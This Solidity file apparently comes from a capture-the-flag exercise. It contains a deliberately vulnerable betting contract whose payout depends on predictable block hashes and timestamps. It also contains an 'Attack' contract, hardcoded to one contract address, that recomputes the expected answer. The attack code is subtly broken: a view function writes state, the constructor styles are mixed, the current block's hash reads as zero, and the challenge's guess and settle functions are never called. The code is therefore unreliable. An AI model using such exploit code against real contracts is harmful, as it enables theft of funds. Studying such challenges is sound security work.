pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;
    uint8 public answer;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 100 wei);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 100 wei);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        //guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(200 wei);
        }
    }
}

contract Attack {
    PredictTheFutureChallenge externalContract;
    uint8 answer;
    uint8 nextAnswer;

    constructor() {
        externalContract = PredictTheFutureChallenge(
            0x83dE35A566013F16c1c21c94EBAaC11EDf849Bd0
        );
    }

    function attack() public view returns (uint8, uint8) {
        answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        nextAnswer = uint8(keccak256(block.blockhash(block.number), now)) % 10;
        return (answer, nextAnswer);
    }
}
